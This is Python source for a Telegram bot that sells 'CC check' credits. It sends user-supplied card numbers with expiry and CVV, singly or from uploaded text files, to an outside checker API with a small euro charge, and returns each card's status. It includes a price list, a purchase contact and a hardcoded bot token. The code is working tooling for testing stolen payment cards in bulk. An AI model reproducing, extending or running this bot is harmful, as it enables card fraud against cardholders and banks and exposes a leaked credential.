import logging
import requests
import telebot
from threading import Event
import time
import json
import random
import string

# Telegram bot token
TOKEN = "7386696229:AAFQ0m0O94-ljMHZdqPD5NMXHciC98HkE9k"
OWNER_ID = 7427691214  # Owner's Telegram ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Define the API endpoint and static parameters
url = "https://daxxteam.com/chk/api.php"

# Event to control the stopping of the card check process
stop_event = Event()

# Lists to store authorized group IDs, user IDs with credits, blocked users, and credit codes
authorized_groups = []
user_credits = {}
blocked_users = []
credit_codes = {}

# Load authorized groups, user credits, blocked users, and credit codes from file (if exists)
try:
    with open('authorized_groups.json', 'r') as file:
        authorized_groups = json.load(file)
except FileNotFoundError:
    authorized_groups = []

try:
    with open('user_credits.json', 'r') as file:
        user_credits = json.load(file)
except FileNotFoundError:
    user_credits = {}

try:
    with open('blocked_users.json', 'r') as file:
        blocked_users = json.load(file)
except FileNotFoundError:
    blocked_users = []

try:
    with open('credit_codes.json', 'r') as file:
        credit_codes = json.load(file)
except FileNotFoundError:
    credit_codes = {}

def save_authorized_groups():
    with open('authorized_groups.json', 'w') as file:
        json.dump(authorized_groups, file)

def save_user_credits():
    with open('user_credits.json', 'w') as file:
        json.dump(user_credits, file)

def save_blocked_users():
    with open('blocked_users.json', 'w') as file:
        json.dump(blocked_users, file)

def save_credit_codes():
    with open('credit_codes.json', 'w') as file:
        json.dump(credit_codes, file)

def generate_random_code(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# Start command handler
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ You are blocked from using this bot.")
        return
    bot.send_message(message.chat.id, "👋 Welcome! Use /register to register and get 10 credits. Use the /chk command followed by card details in the format `cc|mm|yyyy|cvv`, or send a TXT file with card details. Use /stop to stop the card check process.")

# /cmds command handler
@bot.message_handler(commands=['cmds'])
def send_cmds(message):
    cmds_message = (
        "📋 Available commands:\n"
        "/start - Welcome message\n"
        "/cmds - List all commands\n"
        "/register - Register and get 10 credits\n"
        "/info - Get your information\n"
        "/add - Authorize a group or user\n"
        "/remove - Unauthorize a group or user\n"
        "/chk - Check card details\n"
        "/stop - Stop the card check process\n"
        "/buy - View credit packages and pricing\n"
        "/block - Block a user\n"
        "/unblock - Unblock a user\n"
        "/get_credit <number> - Generate credit code\n"
        "/redeem <code> - Redeem a credit code\n"
        "/use <code> - Redeem a credit code\n"
        "/users - Get user statistics (owner only)\n"
        "/br <message> - Broadcast a message to all users (owner only)\n"
    )
    bot.reply_to(message, cmds_message)

# /register command handler
@bot.message_handler(commands=['register'])
def register_user(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ You are blocked from using this bot.")
        return
    user_id = message.from_user.id
    if user_id in user_credits:
        bot.reply_to(message, "✅ You are already registered.")
        return
    
    user_credits[user_id] = 10
    save_user_credits()
    bot.reply_to(message, "🎉 You have been registered and received 10 credits.")

# /info command handler
@bot.message_handler(commands=['info'])
def user_info(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ You are blocked from using this bot.")
        return
    user_id = message.from_user.id
    if user_id not in user_credits and user_id != OWNER_ID:
        bot.reply_to(message, "❌ You are not registered. Use /register to register.")
        return

    credits = "Unlimited" if user_id == OWNER_ID else user_credits.get(user_id, 0)
    rank = "Owner" if user_id == OWNER_ID else "Premium" if credits > 0 else "Free"
    username = message.from_user.username or "N/A"
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
    
    info_message = (
        f"ℹ️ User information:\n"
        f"👤 Username: {username}\n"
        f"🆔 User ID: {user_id}\n"
        f"📛 Full Name: {full_name}\n"
        f"💰 Credits: {credits}\n"
        f"🔰 Rank: {rank}\n"
    )
    bot.reply_to(message, info_message)

# /add command handler to authorize a group or user
@bot.message_handler(commands=['add'])
def add_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "ℹ️ Usage: /add group <group_id> or /add <user_id> <credits>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id not in authorized_groups:
            authorized_groups.append(group_id)
            save_authorized_groups()
            bot.reply_to(message, f"✅ Group {group_id} has been authorized for CC checks.")
        else:
            bot.reply_to(message, f"ℹ️ Group {group_id} is already authorized.")

    else:
        if len(args) != 3:
            bot.reply_to(message, "ℹ️ Usage: /add <user_id> <credits>")
            return
        user_id = int(args[1])
        credits = int(args[2])
        user_credits[user_id] = user_credits.get(user_id, 0) + credits
        save_user_credits()
        bot.reply_to(message, f"✅ User {user_id} has been authorized with {credits} credits.")

# /remove command handler to unauthorize a group or user
@bot.message_handler(commands=['remove'])
def remove_authorization(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "ℹ️ Usage: /remove group <group_id> or /remove userid <user_id>")
        return

    if args[1] == 'group':
        group_id = int(args[2])
        if group_id in authorized_groups:
            authorized_groups.remove(group_id)
            save_authorized_groups()
            bot.reply_to(message, f"✅ Group {group_id} has been unauthorized.")
        else:
            bot.reply_to(message, f"ℹ️ Group {group_id} is not authorized.")

    elif args[1] == 'userid':
        user_id = int(args[2])
        if user_id in user_credits:
            del user_credits[user_id]
            save_user_credits()
            bot.reply_to(message, f"✅ User {user_id} has been unauthorized.")
        else:
            bot.reply_to(message, f"ℹ️ User {user_id} is not authorized.")

    else:
        bot.reply_to(message, "❌ Invalid type. Use 'group' or 'userid'.")

# /chk command handler
@bot.message_handler(commands=['chk'])
def check_card(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ You are blocked from using this bot.")
        return
    user_id = message.from_user.id
    if user_id != OWNER_ID and user_id not in user_credits and message.chat.id not in authorized_groups:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    if user_id != OWNER_ID and user_credits.get(user_id, 0) <= 0:
        bot.reply_to(message, "❌ You don't have enough credits to use this command.")
        return

    card_details = message.text.split()[1:]
    if not card_details:
        bot.reply_to(message, "ℹ️ Please provide card details in the format `cc|mm|yyyy|cvv`.")
        return

    stop_event.clear()

    for card in card_details:
        if stop_event.is_set():
            bot.reply_to(message, "🛑 Card check process stopped.")
            break

        if user_id != OWNER_ID:
            user_credits[user_id] -= 1
            save_user_credits()

        start_time = time.time()
        params = {
            'lista': card,
            'mode': 'cvv',
            'amount': 0.5,
            'currency': 'eur'
        }
        try:
            response = requests.get(url, params=params)
            end_time = time.time()
        except requests.exceptions.RequestException as e:
            bot.reply_to(message, f"❌ Error connecting to API: {e}")
            continue
        
        if response.headers.get('Content-Type') == 'application/json':
            try:
                response_data = response.json()
                bot.reply_to(message, response_data.get("response", "ℹ️ No response"))
            except requests.exceptions.JSONDecodeError:
                bot.reply_to(message, f"❌ Failed to decode JSON response. Response content: {response.text}")
                continue
        else:
            bot.reply_to(message, response.text)

        time.sleep(10)

# Document handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ You are blocked from using this bot.")
        return
    user_id = message.from_user.id
    if user_id not in user_credits and user_id != OWNER_ID:
        bot.reply_to(message, "❌ You are not registered. Use /register to register.")
        return

    if user_id != OWNER_ID and user_credits.get(user_id, 0) <= 0:
        bot.reply_to(message, "❌ You don't have enough credits to use this command.")
        return

    if message.document.mime_type == 'text/plain':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open('lista.txt', 'wb') as f:
            f.write(downloaded_file)
        
        with open('lista.txt', 'r') as f:
            lista_values = f.readlines()
        
        stop_event.clear()

        for lista in lista_values:
            if stop_event.is_set():
                bot.reply_to(message, "🛑 Card check process stopped.")
                break

            if user_id != OWNER_ID:
                user_credits[user_id] -= 1
                save_user_credits()

            start_time = time.time()
            lista = lista.strip()
            if lista:
                params = {
                    'lista': lista,
                    'mode': 'cvv',
                    'amount': 0.5,
                    'currency': 'eur'
                }
                try:
                    response = requests.get(url, params=params)
                    end_time = time.time()
                except requests.exceptions.RequestException as e:
                    bot.reply_to(message, f"❌ Error connecting to API: {e}")
                    continue
                
                if response.headers.get('Content-Type') == 'application/json':
                    try:
                        response_data = response.json()
                        bot.reply_to(message, response_data.get("response", "ℹ️ No response"))
                    except requests.exceptions.JSONDecodeError:
                        bot.reply_to(message, f"❌ Failed to decode JSON response. Response content: {response.text}")
                        continue
                else:
                    bot.reply_to(message, response.text)

                time.sleep(10)

# /stop command handler
@bot.message_handler(commands=['stop'])
def stop_process(message):
    if message.from_user.id == OWNER_ID:
        stop_event.set()
        bot.reply_to(message, "🛑 Card check process has been stopped.")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.")

# /buy command handler
@bot.message_handler(commands=['buy'])
def buy_credits(message):
    buy_message = (
        "💳 Credit packages:\n"
        "100 credits - $1\n"
        "500 credits - $5\n"
        "1000 credits - $8\n"
        "Contact @YourExDestiny to purchase."
    )
    bot.reply_to(message, buy_message)

# /block command handler
@bot.message_handler(commands=['block'])
def block_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ Usage: /block <user_id>")
        return

    user_id = int(args[1])
    if user_id not in blocked_users:
        blocked_users.append(user_id)
        save_blocked_users()
        bot.reply_to(message, f"✅ User {user_id} has been blocked.")
    else:
        bot.reply_to(message, f"ℹ️ User {user_id} is already blocked.")

# /unblock command handler
@bot.message_handler(commands=['unblock'])
def unblock_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ Usage: /unblock <user_id>")
        return

    user_id = int(args[1])
    if user_id in blocked_users:
        blocked_users.remove(user_id)
        save_blocked_users()
        bot.reply_to(message, f"✅ User {user_id} has been unblocked.")
    else:
        bot.reply_to(message, f"ℹ️ User {user_id} is not blocked.")

# /get_credit command handler
@bot.message_handler(commands=['get_credit'])
def get_credit_code(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ Usage: /get_credit <number_of_credits>")
        return

    credits = int(args[1])
    code = generate_random_code()
    credit_codes[code] = credits
    save_credit_codes()
    bot.reply_to(message, f"✅ Credit code generated: {code} for {credits} credits.")

# /redeem and /use command handler
@bot.message_handler(commands=['redeem', 'use'])
def redeem_code(message):
    if message.from_user.id in blocked_users:
        bot.reply_to(message, "❌ You are blocked from using this bot.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ Usage: /redeem <code> or /use <code>")
        return

    code = args[1]
    if code in credit_codes:
        credits = credit_codes.pop(code)
        save_credit_codes()
        user_id = message.from_user.id
        user_credits[user_id] = user_credits.get(user_id, 0) + credits
        save_user_credits()
        bot.reply_to(message, f"🎉 You have redeemed {credits} credits.")
    else:
        bot.reply_to(message, "❌ Invalid code.")

# /users command handler (owner only)
@bot.message_handler(commands=['users'])
def users_stats(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    total_users = len(user_credits)
    free_users = sum(1 for credits in user_credits.values() if credits == 0)
    premium_users = total_users - free_users
    total_groups = len(authorized_groups)

    stats_message = (
        f"📊 User Statistics:\n"
        f"👥 Total users: {total_users}\n"
        f"🆓 Free users: {free_users}\n"
        f"💎 Premium users: {premium_users}\n"
        f"👥 Total groups: {total_groups}\n"
    )
    bot.reply_to(message, stats_message)

# /br command handler (owner only)
@bot.message_handler(commands=['br'])
def broadcast_message(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split(' ', 1)
    if len(args) != 2:
        bot.reply_to(message, "ℹ️ Usage: /br <message>")
        return

    broadcast_msg = args[1]
    for user_id in user_credits.keys():
        try:
            bot.send_message(user_id, f"📢 Broadcast message:\n\n{broadcast_msg}")
        except Exception as e:
            logging.error(f"Error sending message to {user_id}: {e}")

    bot.reply_to(message, "✅ Broadcast message sent to all users.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    bot.polling(none_stop=True)
        
